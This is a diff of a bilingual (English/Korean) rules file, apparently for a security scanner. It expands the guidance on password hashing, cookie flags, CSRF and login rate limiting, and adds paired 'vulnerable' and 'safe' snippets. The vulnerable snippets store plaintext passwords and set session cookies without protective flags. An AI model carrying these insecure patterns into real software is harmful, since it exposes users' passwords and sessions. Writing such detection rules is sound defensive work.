-      en: "Hash the password with bcrypt, scrypt or Argon2id before storing it.",
-      ko: "저장하기 전에 bcrypt, scrypt 또는 Argon2id로 비밀번호를 해시하세요.",
+      en: "Never store the password itself. Store a hash from a password hashing function with a per-user salt: Argon2id (preferred), scrypt or bcrypt, for example `await argon2.hash(password)` when the user signs up and `argon2.verify(hash, password)` at login.",
+      ko: "비밀번호 자체를 저장하지 마세요. 사용자별 salt를 적용한 비밀번호 해시 함수(Argon2id 권장, scrypt, bcrypt)의 결과만 저장하세요. 예: 가입할 때 `await argon2.hash(password)`, 로그인할 때 `argon2.verify(hash, password)`.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "await User.create({ email, password });",
+        safe: "await User.create({ email, passwordHash: await argon2.hash(password) });",
+      },
+    ],
   },
   {
     id: "PG-COOKIE-001",
@@ -288,15 +394,26 @@ export const SOURCE_RULES = [
     defaultSeverity: "medium",
     scope: "code",
     languages: ["javascript", "typescript", "go"],
-    standards: { owasp: ["A02:2025"], cwe: ["CWE-1004", "CWE-614"], cert: [] },
+    standards: {
+      owasp: ["A01:2025", "A02:2025"],
+      cwe: ["CWE-1004", "CWE-614", "CWE-1275"],
+      cert: [],
+    },
     rationale: {
-      en: "Cookies may be read by scripts, sent over plain HTTP or sent cross-site.",
-      ko: "스크립트가 쿠키를 읽거나, 쿠키가 평문 HTTP로 전송되거나, 다른 사이트에서 보낸 요청에 함께 실릴 수 있습니다.",
+      en: "A session cookie without HttpOnly can be read by any injected script, so an XSS flaw becomes a stolen session. Without Secure it can be sent over plain HTTP and captured on the network. Without SameSite the browser may attach it to requests started by other sites, which enables CSRF.",
+      ko: "HttpOnly가 없는 세션 쿠키는 주입된 스크립트가 읽을 수 있어 XSS 결함이 세션 탈취로 이어집니다. Secure가 없으면 평문 HTTP로 전송되어 네트워크에서 가로채일 수 있습니다. SameSite가 없으면 브라우저가 다른 사이트가 시작한 요청에도 쿠키를 실을 수 있어 CSRF가 가능해집니다.",
     },
     remediation: {
-      en: "Set httpOnly, secure and sameSite ('lax' or 'strict') on session cookies.",
-      ko: "세션 쿠키에 httpOnly, secure, sameSite('lax' 또는 'strict')를 설정하세요.",
+      en: "Set all three on session and authentication cookies: `res.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'lax' })`, or in Go `http.Cookie{HttpOnly: true, Secure: true, SameSite: http.SameSiteLaxMode}`. Use `strict` when the site is not entered through cross-site links. Secure needs HTTPS, but browsers such as Chrome and Firefox also accept Secure cookies on `http://localhost`, so development there can keep it on.",
+      ko: "세션·인증 쿠키에는 세 가지를 모두 설정하세요: `res.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'lax' })`, Go에서는 `http.Cookie{HttpOnly: true, Secure: true, SameSite: http.SameSiteLaxMode}`. 다른 사이트의 링크로 들어올 일이 없다면 `strict`를 쓰세요. Secure는 HTTPS가 필요하지만 Chrome, Firefox 같은 브라우저는 `http://localhost`에서도 Secure 쿠키를 받아들이므로 그곳의 개발에서는 켜 둘 수 있습니다.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "res.cookie('sid', token);",
+        safe: "res.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'lax' });",
+      },
+    ],
   },
   {
     id: "PG-CSRF-001",
@@ -307,12 +424,12 @@ export const SOURCE_RULES = [
     languages: JS_TS,
     standards: { owasp: ["A01:2025"], cwe: ["CWE-352"], cert: [] },
     rationale: {
-      en: "Another site may trigger state changes with the user's cookies.",
-      ko: "다른 사이트가 사용자의 쿠키로 상태 변경 요청을 일으킬 수 있습니다.",
+      en: "A route that changes state and authenticates only by cookie can be triggered by any website the logged-in user visits: the browser attaches the cookie to a forged form post or fetch. An attacker can then change the account email, move money or delete data as the victim.",
+      ko: "상태를 바꾸면서 쿠키로만 인증하는 라우트는 로그인한 사용자가 방문한 아무 웹사이트에서나 호출될 수 있습니다. 브라우저가 위조된 폼 전송이나 fetch에도 쿠키를 실어 보내기 때문입니다. 공격자는 피해자 권한으로 계정 이메일을 바꾸거나, 송금하거나, 데이터를 삭제할 수 있습니다.",
     },
     remediation: {
-      en: "Use CSRF tokens (or SameSite=strict cookies plus Origin checks) for cookie-authenticated POST/PUT/PATCH/DELETE routes.",
-      ko: "쿠키로 인증하는 POST/PUT/PATCH/DELETE 라우트에는 CSRF 토큰(또는 SameSite=strict 쿠키와 Origin 검사)을 사용하세요.",
+      en: "Add a CSRF token to every state-changing request (a synchronizer token or double-submit cookie from a maintained middleware), set session cookies to `SameSite=Lax` or `Strict`, and check the `Origin` or `Sec-Fetch-Site` header. Never change state on GET requests.",
+      ko: "상태를 바꾸는 모든 요청에 CSRF 토큰을 추가하고(유지보수되는 미들웨어의 synchronizer token이나 double-submit 쿠키), 세션 쿠키는 `SameSite=Lax` 또는 `Strict`로 설정하며, `Origin`이나 `Sec-Fetch-Site` 헤더를 확인하세요. GET 요청으로 상태를 바꾸지 마세요.",
     },
   },
   {
@@ -324,12 +441,12 @@ export const SOURCE_RULES = [
     languages: JS_TS,
     standards: { owasp: ["A07:2025"], cwe: ["CWE-307"], cert: [] },
     rationale: {
-      en: "Passwords or reset codes can be guessed by automated requests.",
-      ko: "자동화된 요청으로 비밀번호나 재설정 코드를 추측할 수 있습니다.",
+      en: "Without a limit on attempts, an attacker can try thousands of passwords per minute against one account, try one common password against many accounts (password spraying), replay leaked username and password pairs (credential stuffing), or guess short password-reset codes.",
+      ko: "시도 횟수에 제한이 없으면 공격자는 한 계정에 분당 수천 개의 비밀번호를 대입하거나, 흔한 비밀번호 하나를 여러 계정에 시도(password spraying)하거나, 유출된 계정·비밀번호 쌍을 재사용(credential stuffing)하거나, 짧은 비밀번호 재설정 코드를 추측할 수 있습니다.",
     },
     remediation: {
-      en: "Add per-account and per-IP rate limiting or lockout (e.g. express-rate-limit) to authentication routes.",
-      ko: "인증 라우트에 계정별·IP별 요청 제한이나 계정 잠금(예: express-rate-limit)을 추가하세요.",
+      en: "Limit attempts per account and per IP on login, password-reset and code-verification routes, for example with `express-rate-limit` plus increasing delays or a temporary lockout after repeated failures. Return the same error for an unknown user and a wrong password, and consider MFA. Prefer delays to permanent lockout, which attackers can use to lock real users out.",
+      ko: "로그인, 비밀번호 재설정, 코드 검증 라우트에 계정별·IP별 시도 제한을 두세요. 예를 들어 `express-rate-limit`에 더해 실패가 반복되면 지연을 늘리거나 일시적으로 잠그세요. 없는 사용자와 틀린 비밀번호에는 같은 오류를 돌려주고 MFA도 고려하세요. 영구 잠금은 공격자가 실제 사용자를 잠그는 데 악용할 수 있으므로 지연 방식을 우선하세요.",
     },
   },
 ] as const satisfies readonly RuleDefinition[];
